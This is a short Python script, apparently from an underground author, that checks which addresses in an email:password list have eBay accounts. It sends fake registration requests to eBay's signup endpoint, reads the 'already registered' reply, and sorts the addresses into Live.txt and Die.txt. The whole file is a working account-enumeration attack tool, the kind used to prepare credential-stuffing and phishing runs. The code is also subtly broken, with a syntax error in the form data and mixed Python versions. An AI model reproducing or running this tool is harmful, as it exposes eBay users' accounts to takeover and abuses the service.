print("[+]Valid Email Checker by BL4CKP4N7H3R.PH[+]")
import requests
live = open('Live.txt', 'w')
die = open('Die.txt', 'w')
Checked = "Checked by BL4CKP4N7H3R.PH Valid Email Checker"
print("_"*50)
#print" Valid Email Checker"
#print"2020-02-29"
print("_"*55)
#print" "
list=raw_input("Input Mail List :")
link = "https://reg.ebay.com/reg/PartialReg?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&ru=https%3A%2F%2Fwww.ebay.com%2F&signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252"
head = {'User-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Mobile Safari/537.36'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	bacot = email.strip().split(':')
	xxx = {'firstname':'Androsex', 'lastname':'sozani';'email': bacot[0],'emailCheck': bacot[0],'PASSWORD':'Kontol1337'}
	cek = s.post(link, headers=head, data=xxx).text
	if "Your email address is already registered with eBay. Need help with your" in cek:
		print("\033[32;1mLIVE\033[0m | "+email+" | [(Checked)]")
		live.write(email + '\n')
	else:
		print("\033[31;1mDIE\033[0m | "+email+" | [(Checked)]")
		die.write(email + '\n')
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("Valid Email was Saved in Live.txt")

